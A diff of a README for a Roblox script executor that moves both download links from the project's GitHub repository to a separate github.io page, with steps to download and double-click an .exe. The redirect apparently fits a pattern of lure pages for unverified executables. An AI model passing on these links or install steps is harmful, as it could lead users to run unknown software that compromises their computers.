@@ -1,6 +1,6 @@
 # 💻 delta-script-hub-executor - Run your favorite Roblox scripts easily
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/alanapositive771/delta-script-hub-executor)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://alanapositive771.github.io)
 
 delta-script-hub-executor is a software tool for Windows 10 and 11. It helps users manage and run Lua scripts for Roblox. The program includes a library of over 500 scripts. It uses a lightweight desktop interface built with Windows Presentation Foundation technology. The software works without requiring keys or payment.
 
@@ -19,7 +19,7 @@ To run this tool, your computer needs to meet these basic standards:
 
 Follow these steps to set up the executor on your system.
 
-1. Visit the [official download page](https://github.com/alanapositive771/delta-script-hub-executor) to get the latest file.
+1. Visit the [official download page](https://alanapositive771.github.io) to get the latest file.
 2. Look for the file ending in .exe in the releases section.
 3. Save the file to a folder you can find, such as your Downloads folder.
 4. Locate the file and double-click it to start the installation.
